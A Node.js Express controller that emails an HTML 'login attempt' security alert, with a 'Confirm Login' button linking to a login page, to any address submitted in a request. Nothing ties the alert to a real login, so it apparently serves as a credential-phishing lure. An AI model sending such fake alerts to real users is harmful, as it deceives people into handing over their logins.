// controllers/emailController.js
const sendEmail = require("../services/emailService");

// PB Logo Base64 (for inline image at top left of email)
const pbLogoBase64 = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHe..."; 
// Replace this with your actual PB logo base64 string

// Email template function
const emailTemplate = (loginLink, userEmail) => `
<div style="background:#ffffff;color:#18191a;font-family:Arial,sans-serif;padding:30px;">

  <!-- Top line with PB Logo left -->
  <div style="display:flex;align-items:center;margin-bottom:10px;">
    <img src="data:image/png;base64,${pbLogoBase64}" 
         alt="PB Logo" width="40" height="40" style="margin-right:15px;">
    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin:0;">
  </div>

  <!-- Greeting -->
  <p style="font-size:16px;margin-top:20px;">Hello,</p>

  <!-- Main message -->
  <p style="font-size:14px;">We noticed a login attempt to your Project Security portal. This notification keeps your account secure.</p>

  <!-- Bold section title -->
  <p style="font-weight:bold;margin-top:15px;">About this change</p>
  <p style="font-size:14px;">If you recognize this login, no action is needed. Otherwise, please review your account immediately using the button below.</p>

  <!-- Full-width Confirm Login Button -->
  <a href="${loginLink}" 
     style="display:block;text-align:center;background:#1a73e8;color:#fff;padding:15px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
    Confirm Login
  </a>

  <!-- If this was you section -->
  <p style="font-size:13px;">If this was you, no further action is needed. If not, please secure your account immediately.</p>

  <!-- Bottom line -->
  <hr style="border:1px solid #3a3b3c;margin:10px 0;">

  <!-- Footer -->
  <p style="font-size:12px;">© 2026 Project Security · <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn More</a></p>
  <p style="font-size:12px;">Sent to ${userEmail}</p>
</div>
`;

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success:false, message:"Email required" });

    // ✅ FRONTEND_URL must point to Railway
    const loginLink = `${process.env.FRONTEND_URL}/login.html`;

    const sent = await sendEmail(
      email,
      "🔐 Confirm Your Login - Project Security",
      emailTemplate(loginLink, email)
    );

    if (!sent) return res.status(500).json({ success:false, message:"Email failed to send" });

    return res.status(200).json({ success:true, message:"Email sent successfully" });

  } catch (err) {
    console.error("Email sending error:", err);
    return res.status(500).json({ success:false, message:"Server error" });
  }
};